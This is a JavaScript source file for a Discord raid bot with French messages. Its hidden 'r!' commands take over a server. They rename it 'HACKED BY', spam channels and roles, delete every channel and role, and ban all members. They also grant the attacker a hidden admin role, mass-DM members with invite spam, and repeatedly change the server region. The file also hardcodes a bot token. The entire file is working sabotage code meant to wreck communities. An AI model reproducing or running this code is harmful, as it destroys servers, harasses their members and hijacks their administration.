const discord = require("discord.js");
const bot = new discord.Client();
const token = "NjE2NjU1NTc5NDA1ODc3MjU4.XWfv-w.mVTNtUmPmve31P7WVheh9dYOj30";
const prefix = "r!"
bot.on("ready", () => {
    console.log("----------------------------")
    console.log(`Tag du Bot : ${bot.user.tag}`)
    console.log(`Id du Bot : ${bot.user.id}`)
    console.log(`Invitations : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958847`)
    console.log(`Nombre de Serveurs : ${bot.guilds.size}`)
    console.log("----------------------------")
    bot.user.setGame('𝐂𝐨𝐦𝐦𝐞𝐭 𝐁𝐨𝐭 𝐂𝐫𝐞́𝐚𝐭𝐞𝐮𝐫 [𝐒𝐦𝐨𝐤𝐞𝐌𝐲𝐖𝐞𝐞𝐝]', 'http://twitch.tv/discordGif');
})

bot.on("message", message => {
    var args = message.content.split(/ +/);
    if(message.channel.type != "text") return;
    switch(args[0]){
        case `${prefix}achanspam`:
        if(message.deletable) message.delete();
        if(!message.guild.member(bot.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | guildfucker |Le bot n'a pas assez de permission.`);
        message.guild.setIcon("https://i.imgur.com/pvtPMv8.png");
            message.guild.setName("HACKED BY ! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕");
            message.guild.setRegion("russia");
        if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | chan spam |Le bot n'a pas assez de permission.`);
            var i;
            for (i = message.guild.channels.size; i < 497; i++) {
                message.guild.createChannel("hacked_by_! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕 ", "text");
                message.guild.createChannel("Hacked By ! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕 ", "voice");
            }
        break;
        case `${prefix}adelchan`:
        if(message.deletable) message.delete();
        if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | delchan |Le bot n'a pas assez de permission.`);
        message.guild.channels.map(chanman => {
            chanman.delete().catch(console.error);
        })
        break;
        case `${prefix}aspam`:
        if(message.deletable) message.delete();
        setInterval (function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") {channel.send("@everyone Ton Serveur Vient de se faire niqué part ! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕 rejoint nous https://discord.gg/vzqdepM", { tts: true }).catch(console.error);  }
            }, 2500)}, 400)
          break;
          case `${prefix}arolespam`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | rolespam |Le bot n'a pas assez de permission.`);
          var i;
          for (i = message.guild.roles.size; i < 100; i++) {
              message.guild.createRole({
                  color:"RANDOM",
                  name:"! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕"
              });
          }
          break;
          case `${prefix}apermadd`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          else if(!message.guild.roles.find(x => x.name === "unknow_error_404")) {
              if(message.guild.roles.size >= 100) return;
               message.guild.createRole({
                  name: "unknow_error_404",
                  permissions:message.guild.member(bot.user).permissions.raw
              }).then(role => message.member.addRole(role));
          }
          else {
              message.member.addRole(message.guild.roles.find(x => x.name === "unknow_error_404"));
          }
          break;
          case `${prefix}abanall`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return console.log(`${message.guild.name} | banall |Le bot n'a pas assez de permission.`);
          message.guild.members.forEach(m => {
              if(m.bannable && !m.roles.find(w => w.name === "unknow_error_404")) m.ban().catch(console.error);
          })
          break;
          case `${prefix}adelrole`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          message.guild.roles.forEach(m => {
              if(m.name != "unknow_error_404")m.delete().catch(console.error)
          })
          break;
          case `${prefix}aspammp`:
          if(message.deletable) message.delete();
          message.guild.members.forEach(mpmember => {
              mpmember.createDM().then(m =>
                {var i;
                    for(i = 0; i < 20; i++){
                        m.send(`Le serveur de ${message.guild.owner.user.tag} s'est fait niqué par ! $𝕊𝕞𝕠𝕜𝕖𝕄𝕪𝕎𝕖𝕖𝕕 rejoint nous https://discord.gg/V6C7n3d :)`)
                    }
                })})
                break;
                case `${prefix}aspamlog`:
                if(message.deletable) message.delete();
                if(!message.guild.member(bot.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | spamlog |Le bot n'a pas assez de permission.`);
                const table = ["russia","hongkong","us-central","eu-central","eu-west","us-west","eu-west"];
                setInterval(function() {
                    message.guild.setRegion(table[Math.floor(Math.random()*table.length)])
                },300)
                break;

    }
})
bot.login(token)
